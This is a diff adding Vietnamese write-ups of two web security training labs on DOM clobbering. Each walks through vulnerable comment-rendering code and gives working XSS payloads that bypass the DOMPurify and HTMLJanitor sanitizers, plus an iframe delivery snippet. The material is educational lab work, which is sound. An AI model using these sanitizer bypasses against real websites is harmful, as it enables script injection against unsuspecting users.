@@ -227,6 +227,121 @@ postMessage(payload);
 - Sau khi load trang web vào iframe => gửi message chứa payload => xss xảy ra
 - Sử dụng `"*"`, vì muốn gửi cho tất cả chứ không còn gửi cho chính nó
 
+### Lab: Exploiting DOM clobbering to enable XSS
+> Lỗi này chỉ hoạt động trên **Chrome**
+{: .prompt-info}
+
+#### Analysis
+- Truy cập blog bất kì, sử dụng chức năng comment và quan sát `GET /resources/js/loadCommentsWithDomClobbering.js`
+
+```js
+let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
+let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
+
+let divImgContainer = document.createElement("div");
+divImgContainer.innerHTML = avatarImgHTML
+```
+- Ứng dụng tạo ra `defaultAvatar` với giá trị là `window.defaultAvatar` hoặc `{avatar: '/resources/images/avatarDefault.svg'}`
+- Ở đây ta thấy `defaultAvatar` chưa tồn tại, nên các bình luận trước đó sử dụng chung `{avatar: '/resources/images/avatarDefault.svg'}`
+- Sau đó ứng dụng tạo ra `avatarImgHTML` là thẻ `<img>` với giá trị là `defaultAvatar.avatar` nếu có hoặc sử dụng giá trị mặc định
+
+#### Exploit
+- Comment với payload sau:
+
+```html
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+```
+- Comment tiếp tục một lần nữa với payload bất kỳ => `XSS` xảy ra
+- Quan sát mã nguồn ta thấy ứng dụng sử dụng `DOMPurify` để làm sạch đầu vào
+
+```js
+if (comment.body) {
+    let commentBodyPElement = document.createElement("p");
+    commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);
+
+    commentSection.appendChild(commentBodyPElement);
+}
+```
+- Trình duyệt giải mã `&quot;` thành `"` khiến **href** kết thúc sớm
+- `onerror=alert(1)` — được hiểu là thuộc tính mới
+- Kích hoạt **XSS** thông qua `onerror`
+- **DOMPurify** không **chặn** hoặc **encode** `cid:`
+- `//` phía sau để **comment** `"` dư ra ở **comment** mới
+
+```html
+<img class="avatar" src="cid:" onerror="alert(1)//&quot;">
+```
+
+### Lab: Clobbering DOM attributes to bypass HTML filters
+> Lỗi này chỉ hoạt động trên **Chrome**
+{: .prompt-info}
+
+#### Analysis
+- Truy cập blog bất kì, sử dụng chức năng **comment** và quan sát **code** đáng chú ý của 2 response sau:
+
+```js
+let janitor = new HTMLJanitor(
+    {tags: 
+        {input:
+            {name:true,
+            type:true,
+            value:true},
+        form:{id:true},
+        i:{},
+        b:{},
+        p:{}
+        }
+    }
+```
+{: file="/resources/js/htmlJanitor.js"}
+
+```js
+// Sanitize attributes
+for (var a = 0; a < node.attributes.length; a += 1) {
+var attr = node.attributes[a];
+
+if (shouldRejectAttr(attr, allowedAttrs, node)) {
+    node.removeAttribute(attr.name);
+    // Shift the array to continue looping.
+    a = a - 1;
+}
+}
+```
+{: file="/resources/js/loadCommentsWithHtmlJanitor.js"}
+
+- Ứng dụng sử dụng thư viện **HTMLJanitor** để **filter input**
+    - Chỉ chấp nhận các **tags**: 
+        - `input` với **attribute** `name`, `type`, `value`
+        - `form` với **attribute** `id`
+        - `i`
+        - `b`
+        - `p`
+- Phân tích **code** ta sẽ thấy hành vi:
+    - Duyệt qua các thuộc tính của **node**
+    - Xóa các thuộc tính không nằm trong **white list**
+
+#### Exploit
+- Ta phải tấn công, ghi đè đề `node.attributes.length` thành `undefind`
+- Post **comment** sau:
+
+```html
+<form id=x tabindex=0 onfocus=print()>
+    <input id=attributes>
+</form>
+```
+- Sử dụng các thẻ được phép `form` và `input`
+- `node.attributes.length` => `form.attributes.length` tức trỏ tới `input` => `undefind`
+- Đến **exploit server** dán vào **body** mã sau và **deliver to victim**
+
+```html
+<iframe src=https://0ae60019044142ed8250343e00790097.web-security-academy.net/post?postId=2 onload="setTimeout(()=>this.src=this.src+'#x',500)">
+```
+- Khi **victim** truy cập vào `exploit` sau `0.5s` sẽ thêm **fragment** đển **focus** vào `form` có `id=x` => `print()`
+- Kiểm tra sau **post** bạn sẽ thấy không còn `id` trong input nữa, nhưng chương trình vẫn hoạt động:
+    - Do ứng dụng sẽ dọn từ `father` tới `son`
+    - Tức `form` sẽ được dọn trước rồi tới `input` nên thuộc tính `id` trong input vẫn còn mặc dù không được phép
+    - `form.attributes.length` vẫn hoạt động vì `id=attributes` chưa bị dọn
+
 ## Prevent
 ---
 1. Không cho phép dữ liệu không đáng tin **(untrusted data)** đi vào **sink**
